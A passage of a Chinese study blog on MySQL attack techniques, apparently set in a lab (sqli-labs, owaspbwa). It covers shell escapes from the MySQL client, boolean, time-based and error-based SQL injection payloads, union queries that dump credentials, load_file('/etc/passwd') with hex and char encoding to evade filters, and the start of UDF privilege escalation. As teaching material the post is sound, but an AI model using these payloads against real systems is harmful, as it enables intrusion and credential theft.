class="line">| 2019-08-24 07:40:49 | 2019-08-24 07:40:49 |</span><br><span class="line">+---------------------+---------------------+</span><br></pre></td></tr></table></figure>
+<h1 id="二、MySQL-执行系统命令">二、MySQL 执行系统命令</h1>
+<h2 id="1-使用-system-shell-cmd">1 使用 <code>system shell-cmd</code></h2>
+<p>在 MySQL 的命令行界面中可以使用 <code>system shell-cmd</code> 或者<code>\! shell-cmd</code> 格式执行 shell 命令。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; \! pwd  # 显示当前目录</span><br><span class="line">&#x2F;home&#x2F;jaylen</span><br><span class="line">mysql&gt; \! ls # 当前目录内容</span><br><span class="line">Desktop    Downloads	     less   Pictures  Templates  Videos</span><br><span class="line">Documents  examples.desktop  Music  Public    test.txt	 work</span><br><span class="line">mysql&gt; \! cat .&#x2F;work&#x2F;test  # 使用 cat 查看文件内容</span><br><span class="line">1	jack</span><br><span class="line">2	jackit</span><br></pre></td></tr></table></figure>
+<p>也可以打开一个新的 shell，关闭 shell (使用 exit 或者 CTRL D)后返回 MySQL 命令行界面。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ysql&gt; \! bash  # 打开终端</span><br><span class="line">jaylen@ubuntu:~$ cd work&#x2F;  # 返回到 设立了</span><br><span class="line">jaylen@ubuntu:~&#x2F;work$ ls</span><br><span class="line">DVWA  hashcat-5.1.0  neo  suctf  test  test.csv</span><br><span class="line">jaylen@ubuntu:~&#x2F;work$ eixt</span><br><span class="line">eixt: command not found</span><br><span class="line">jaylen@ubuntu:~&#x2F;work$ exit # 关闭 shell</span><br><span class="line">exit</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="三、函数在注入过程中的利用">三、函数在注入过程中的利用</h1>
+<p>1、ascii(s)：返回字符串s的第一个字符的ascii码</p>
+<p>可以用于布尔盲注中，结合ord()函数会更加直观显示。时间盲注也行</p>
+<p><code>http://192.168.3.6/Less-5/?id=1' and ascii(database())=115 --+</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_026-1567178982004.jpg" alt="image"></p>
+<p>2、char_length(s)\character_length(s)：返回字符串s的字符数在盲注中可以用到</p>
+<p><code>http://192.168.3.6/Less-5/?id=1' and char_length(database())=8 --+</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_028-1567178982004.jpg" alt="image"></p>
+<p>3、concat(s1,s2,…,sn):合并s1,s2,…sn字符为一个字符</p>
+<p>在注入，将多个字段的数据一列一次性返回，与concat_ws(0x7e,s1,s2,…,sn)一样。</p>
+<p>不过联合注入一般是用group_concat(s1,s2,…,sn)函数，其将多个字段的所有函数一次性返回。</p>
+<p><code>http://192.168.3.6/Less-1/?id=0' union select 0,group_concat(username),group_concat(password)from users --+</code></p>
+<p>4、mid(s,n,len)\substr(s,n,len)\substring(s,n,len)：从s中的n位置开始截取长度为len的子字符串一般用于盲注。</p>
+<p><code>http://192.168.3.6/Less-5/?id=1' and ord(mid((database()),1,1))=ascii('s')--+</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_031-1567178982004.jpg" alt="image"></p>
+<p>5、right(s,n)：返回字符串s的后n个字符一般用于盲注。</p>
+<p><code>http://192.168.3.6/Less-5/?id=1' and ord(right((database()),1))=ascii('y')--+</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_033-1567178982005.jpg" alt="image"></p>
+<p>6、left(s,n):返回字符串s的前n个字符一般用于盲注。</p>
+<p><code>http://192.168.3.6/Less-5/?id=1' and ord(left((database()),1))=ascii('s')--+</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_035-1567178982005.jpg" alt="image"></p>
+<p>7、if(expr,v1,v2)：如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2</p>
+<p>一般结合sleep(),用于时间盲注。</p>
+<p><code>http://192.168.3.6/Less-5/?id=1' and if((ord(left((database()),1))=ascii('s')),sleep(5),0)--+</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_037-1567178982005.jpg" alt="image"></p>
+<p>8、strcmp(s1,s2)：比较s1和s2，如相同返回0，s1&gt;s2返回1，否则返回-1</p>
+<p>一般用于盲注,这里的payload比较微妙。</p>
+<p>当s1与s2相同时会返回0，这时候在if(expr,v1,v2)中会进入1，从而构成判断逻辑。</p>
+<p>[<code>http://192.168.3.6/Less-5/?id=1' and if(strcmp((select database()),'security'),sleep(5),1)--+ ](http://192.168.3.6/Less-5/?id=1')http://192.168.3.6/Less-5/?id=1' and if(strcmp((select database()),'security1'),sleep(5),1)--+</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_039-1567178982005.jpg" alt="image"></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_040-1567178982005.jpg" alt="image"></p>
+<h1 id="四、场景举例">四、场景举例</h1>
+<h2 id="1-不能出现某些特殊字符">1 不能出现某些特殊字符</h2>
+<p>1.<strong>不能出现某些特殊字符</strong></p>
+<blockquote>
+<p>eg：在使用<code>load_file</code>函数的时候，要是url里屏蔽了<code>'</code></p>
+</blockquote>
+<p>可以使用hex转换一下，就可以绕过：</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190823213438646-267160119-1567178504433.png" alt="hex"></p>
+<p>也可以借助<code>ascii</code>和<code>char</code>函数：</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190823214625282-904626059-1567178504460.png" alt="char"></p>
+<p>SQL附录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1 union select @@version,@@version_compile_os,@@hostname,user(),database(),load_file(&#39;&#x2F;etc&#x2F;passwd&#39;),7,8,9;</span><br><span class="line"></span><br><span class="line">select hex(&#39;&#x2F;etc&#x2F;passwd&#39;); -- 2F6574632F706173737764</span><br><span class="line"></span><br><span class="line">-- 需要自己添加0x</span><br><span class="line">select * from users where id&#x3D;1 union select @@version,@@version_compile_os,@@hostname,user(),database(),load_file(0x2F6574632F706173737764),7,8,9;</span><br><span class="line"></span><br><span class="line">-- 字符转换为ASCII码</span><br><span class="line">select ascii(&#39;&#x2F;&#39;),ascii(&#39;e&#39;),ascii(&#39;t&#39;),ascii(&#39;c&#39;),ascii(&#39;&#x2F;&#39;),ascii(&#39;p&#39;),ascii(&#39;a&#39;),ascii(&#39;s&#39;),ascii(&#39;s&#39;),ascii(&#39;w&#39;),ascii(&#39;d&#39;);</span><br><span class="line"></span><br><span class="line">-- ASCII码转为字符串</span><br><span class="line">select char(47,101,116,99,47,112,97,115,115,119,100);</span><br><span class="line"></span><br><span class="line">select * from users where id&#x3D;1 union select @@version,@@version_compile_os,@@hostname,user(),database(),load_file(char(47,101,116,99,47,112,97,115,115,119,100)),7,8,9;</span><br></pre></td></tr></table></figure>
+<h2 id="2-浏览器返回出现乱码">2 浏览器返回出现乱码</h2>
+<p>2.<strong>浏览器返回出现乱码，或者程序对返回结果有敏感检测等</strong></p>
+<blockquote>
+<p>eg：通过<code>hex</code>把返回结果转换为16进制即可</p>
+</blockquote>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190823220135123-718977584-1567178504474.png" alt="unhex"></p>
+<p>SQL附录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(0x2F6574632F706173737764));</span><br><span class="line">select hex(load_file(char(47,101,116,99,47,112,97,115,115,119,100)));</span><br><span class="line"></span><br><span class="line">-- 解密</span><br><span class="line">select unhex(&#39;726F6F743A783A303A303A...6E6F6C6F67696E0A&#39;);</span><br></pre></td></tr></table></figure>
+<h2 id="3-一行查询出所有需要的结果">3 一行查询出所有需要的结果</h2>
+<p>3.一行查询出所有需要的结果</p>
+<blockquote>
+<p>PS：使用<code>concat</code> or <code>concat_ws()</code></p>
+</blockquote>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190824094016926-1701826667-1567178504535.png" alt="concat"></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190824094223131-1214492542-1567178504483.png" alt="concat_ws"></p>
+<p>SQL附录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- 推荐使用concat_ws（有null的时候也是有结果的）</span><br><span class="line">select username from workdb.users where id&#x3D;1 union select concat_ws(&#39;,&#39;,user(),database(),version());</span><br><span class="line"></span><br><span class="line">select hex(&#39;,&#39;); -- 2C</span><br><span class="line"></span><br><span class="line">select username from workdb.users where id&#x3D;1 union select concat_ws(0x2c,user(),database(),version());</span><br></pre></td></tr></table></figure>
+<h2 id="4-需要MySQL显示出报错信息">4 需要MySQL显示出报错信息</h2>
+<p>4.<strong>需要MySQL显示出报错信息</strong></p>
+<blockquote>
+<p>PS：使用<code>updatexml</code> or <code>extractvalue</code></p>
+</blockquote>
+<p>很多时候MySQL会隐藏错误提示，这时候我们可以通过别样的方式来让它显示错误信息，从而得到更多对渗透有利的info</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190824111154618-1709431897-1567178504560.png" alt="hide"></p>
+<p>SQL附录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select convert((select @@version),int);</span><br><span class="line"></span><br><span class="line">select updatexml(1,concat(&#39;~&#39;,(select @@version)),1);</span><br><span class="line"></span><br><span class="line">select extractvalue(1,concat(&#39;~&#39;,(select @@version),1));</span><br></pre></td></tr></table></figure>
+<h2 id="5-延时注入判断">5 延时注入判断</h2>
+<p>有时候网站容错性比较强（各种默认值）在注入的时候<strong>不管加什么参数页面都没什么变化</strong>，这时候可以<strong>使用延时注入</strong>，用<strong>是否卡顿来判断是否有注入点</strong></p>
+<blockquote>
+<p>eg：<code>select * from users where id=1 or sleep(3);</code> or <code>select * from users where id=1 and sleep(3);</code></p>
+</blockquote>
+<p>举个延迟注入获取数据的例子：</p>
+<blockquote>
+<p>eg：获取当前用户名</p>
+</blockquote>
+<p>大体思路：</p>
+<ol>
+<li>查询当前用户猜测出用户名长度</li>
+<li>截取第一个字符并转换为ASCII码</li>
+<li>讲第一个字符的ASCII码和ASCII码表对比，匹配则延迟3s</li>
+<li>继续截取字符并对比，直到全部解猜出来</li>
+</ol>
+<p><strong>获取用户名长度</strong>的SQL附录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-- 获取当前用户的长度，不延迟说明不对</span><br><span class="line">select if(length(user())&#x3D;1,sleep(3),1);</span><br><span class="line">select if(length(user())&#x3D;2,sleep(3),1);</span><br><span class="line">select if(length(user())&#x3D;3,sleep(3),1);</span><br><span class="line">select if(length(user())&#x3D;4,sleep(3),1);</span><br><span class="line">......</span><br><span class="line">select if(length(user())&#x3D;15,sleep(3),1);</span><br><span class="line">select if(length(user())&#x3D;16,sleep(3),1);</span><br><span class="line">select if(length(user())&#x3D;17,sleep(3),1);</span><br><span class="line">select if(length(user())&#x3D;18,sleep(3),1); -- 延迟了3s</span><br><span class="line"></span><br><span class="line">-- PS：可以自己验证一下是不是18位</span><br><span class="line">select user(); -- dnt@192.168.36.144</span><br><span class="line">select char_length(user()); -- 18</span><br></pre></td></tr></table></figure>
+<p><strong>获取用户名每一个字符</strong>的SQL附录：(数据库通用的<code>substring</code>可以换成mysql独有的<code>mid</code>)</p>
+<p>基本上都是在这里匹配：<code>a~z</code>、<code>A~Z</code>、<code>0~9</code>、<code>_、@、%、#...</code>，只看<code>@</code>前面的字符，后面的直接忽略</p>
+<blockquote>
+<p>ASCCI：<code>%：37</code>、<code>0：48~9：57</code>、<code>@：64</code>、<code>A：65~Z：90</code>、<code>_：95</code>、<code>a：97~z：122</code>（可以使用二分法快速定位）</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">-- 获取第一个字符是什么</span><br><span class="line">select if(substring(user(),1,1)&gt;&#39;a&#39;,sleep(3),1); -- 延迟3s，说明第1个字符比a大</span><br><span class="line">select if(substring(user(),1,1)&lt;&#39;z&#39;,sleep(3),1); -- 延迟3s，说明在a~z之间</span><br><span class="line">select if(substring(user(),1,1)&gt;&#39;p&#39;,sleep(3),1); -- 不延迟，说明在a~p之间</span><br><span class="line">select if(substring(user(),1,1)&lt;&#39;h&#39;,sleep(3),1); -- 延迟3s，说明在a~h之间</span><br><span class="line">select if(substring(user(),1,1)&gt;&#39;e&#39;,sleep(3),1); -- 不延迟，说明在a~e之间</span><br><span class="line">select if(substring(user(),1,1)&gt;&#39;c&#39;,sleep(3),1); -- 延迟3s，说明在c~e之间 &#x3D;&#x3D;&gt; 那就是d了</span><br><span class="line">select if(substring(user(),1,1)&#x3D;&#39;d&#39;,sleep(3),1); -- 延迟3s，说明第1个字符是d</span><br><span class="line"></span><br><span class="line">-- 获取第二个字符是什么</span><br><span class="line">select if(substring(user(),2,1)&gt;&#39;a&#39;,sleep(3),1); -- 延迟3s，说明第2个字符比a大</span><br><span class="line">select if(substring(user(),2,1)&lt;&#39;z&#39;,sleep(3),1); -- 延迟3s，说明在a~z之间</span><br><span class="line">select if(substring(user(),2,1)&gt;&#39;p&#39;,sleep(3),1); -- 不延迟，说明在a~p之间</span><br><span class="line">select if(substring(user(),2,1)&lt;&#39;h&#39;,sleep(3),1); -- 不延迟，说明在h~p之间</span><br><span class="line">select if(substring(user(),2,1)&gt;&#39;m&#39;,sleep(3),1); -- 延迟3s，说明在m~p之间</span><br><span class="line">select if(substring(user(),2,1)&lt;&#39;o&#39;,sleep(3),1); -- 延迟3s，说明在m~0之间 &#x3D;&#x3D;&gt; 那就是n了</span><br><span class="line">select if(substring(user(),2,1)&#x3D;&#39;n&#39;,sleep(3),1); -- 延迟3s，说明第2个字符是n</span><br><span class="line"></span><br><span class="line">-- 获取第三个字符是什么</span><br><span class="line">select if(substring(user(),3,1)&gt;&#39;a&#39;,sleep(3),1); -- 延迟3s，说明第3个字符比a大</span><br><span class="line">select if(substring(user(),3,1)&lt;&#39;z&#39;,sleep(3),1); -- 延迟3s，说明在a~z之间</span><br><span class="line">select if(substring(user(),3,1)&gt;&#39;p&#39;,sleep(3),1); -- 延迟3s，说明在p~z之间</span><br><span class="line">select if(substring(user(),3,1)&lt;&#39;v&#39;,sleep(3),1); -- 延迟3s，说明在p~v之间</span><br><span class="line">select if(substring(user(),3,1)&lt;&#39;s&#39;,sleep(3),1); -- 不延迟，说明在s~v之间</span><br><span class="line">select if(substring(user(),3,1)&gt;&#39;t&#39;,sleep(3),1); -- 不延迟，说明在s~t之间 &#x3D;&#x3D;&gt; 要么s要么t</span><br><span class="line">select if(substring(user(),3,1)&#x3D;&#39;s&#39;,sleep(3),1); -- 不延迟</span><br><span class="line">select if(substring(user(),3,1)&#x3D;&#39;t&#39;,sleep(3),1); -- 延迟3s，说明第3个字符是n</span><br><span class="line"></span><br><span class="line">-- 获取第四个字符是什么</span><br><span class="line">select if(substring(user(),4,1)&gt;&#39;a&#39;,sleep(3),1); -- 不延迟，说明第4个字符比a小</span><br><span class="line">select if(substring(user(),4,1)&gt;&#39;A&#39;,sleep(3),1); -- 不延迟，说明第4个字符比A小</span><br><span class="line">select if(substring(user(),4,1)&gt;&#39;0&#39;,sleep(3),1); -- 延迟3s，说明可能是数字或者特殊符号</span><br><span class="line">select if(substring(user(),4,1)&lt;&#39;9&#39;,sleep(3),1); -- 不延迟，说明是9~A之间的特殊符号</span><br><span class="line">select if(substring(user(),4,1)&#x3D;&#39;@&#39;,sleep(3),1); -- 延迟3s，说明就是@了</span><br><span class="line"></span><br><span class="line">-- 说明用户名为：dnt</span><br><span class="line"></span><br><span class="line">-- PS：可以自己验证一下：dnt@</span><br><span class="line">select substring(user(),1,1),substring(user(),2,1),substring(user(),3,1),substring(user(),4,1);</span><br></pre></td></tr></table></figure>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190824131240421-1376814527-1567178504758.png" alt="ascii"></p>
+<h1 id="五、MySQL-UDF-提权">五、MySQL UDF 提权</h1>
+<h2 id="1-背景">1 背景</h2>
+<p>UDF 为 “User-Defined Function” 的所写，即用户自定义函数。MySQL 允许用户添加新的函数，其中一种方法就是通过其提供的 UDF 接口，添加用户自定义函数。用户自定义函数可以使用 C/C++ 语言编写并编译成库文件（其它语言也可以，只要能编译成共享库文件），放到 MySQL 指定的目录下，以便 MySQL 能动态加载用户自定义的函数。</p>
+<p>使用 UDF 可以加载自定义的函数，因此可以通过自定义函数执行各种操作，关于用户自定义函数的编写可参考，<a href="https://docstore.mik.ua/orelly/weblinux2/mysql/ch14_01.htm" target="_blank" rel="noopener">Extending MySQL</a></p>
+<h2 id="2-使用-UDF">2 使用 UDF</h2>
+<p>那么如何使用 UDF 进行提权呢？</p>
+<p><strong>前提条件：</strong></p>
+<ol>
+<li>MySQL 用户能写文件到 MySQL 指定的自定义函数库存放目录。</li>
+<li>MySQL 用户具有 <code>INSERT</code> 权限，才能使用 <code>CREATE FUNCTION</code>语句在 MySQL 中添加自定义的函数，此外如果使用 <code>DROP FUNCTION</code> 语句删除自定义函数，还需要有 <code>DELETE</code> 权限。</li>
+</ol>
+<p><strong>实验环境：</strong></p>
+<ul>
+<li>攻击主机：Kali Linux</li>
+<li>MySQL 服务器主机：<a href="https://sourceforge.net/projects/owaspbwa/files/1.2/" target="_blank" rel="noopener">owaspbwa</a></li>
+</ul>
+<p><strong>步骤：</strong></p>
+<ol>
+<li>根据目标系统（MySQL服务器主机）的类型，准备好相应的可加载的库文件，网上有不少 UDF 的库文件，这里使用 Metasploit 自带的 UDF 库，Kali 主机上 <code>find / -name '*mysqludf*'</code> 进行搜索，可以看到可用的库文件，<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql" target="_blank" rel="noopener">GitHub上也有</a>，这里根据系统类型使用 <code>lib_mysqludf_sys_32.so</code>。</li>
+</ol>
